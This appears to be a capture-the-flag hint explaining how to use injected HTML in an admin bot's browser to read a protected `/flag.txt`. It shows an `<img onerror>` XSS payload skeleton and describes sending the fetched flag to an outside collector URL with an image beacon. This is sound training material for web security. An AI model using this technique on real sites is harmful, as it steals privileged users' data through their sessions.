`GET /flag.txt` returns 403 for you — it needs the admin `session` cookie, and
you can't get it (`/internal/bot-login` is backend-only). But code you inject
runs in the admin bot's browser, in the app's origin, so a same-origin
`fetch('/flag.txt')` sends the admin's cookie automatically.

`document.write` won't reliably run a `<script>` you inject, but it will parse an
element with an event handler. An image whose source fails to load runs its
`onerror`:

```html
<img src="x" onerror="/* your JS here */" />
```

Inside `onerror`, fetch `/flag.txt`, read the text, and send it to the collector
at `http://collector:9000/report?f=...` (an image beacon works:
`new Image().src = '...'`).
